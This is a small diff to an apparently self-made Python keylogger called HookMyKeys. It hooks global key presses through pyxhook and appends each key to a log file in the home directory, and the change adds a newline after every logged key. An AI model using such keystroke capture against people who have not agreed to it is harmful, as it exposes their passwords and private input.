@@ -6,6 +6,7 @@ log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
+  fob.write('\n')
 
 new_hook=pyxhook.HookManager()
 new_hook.KeyDown=OnKeyPress
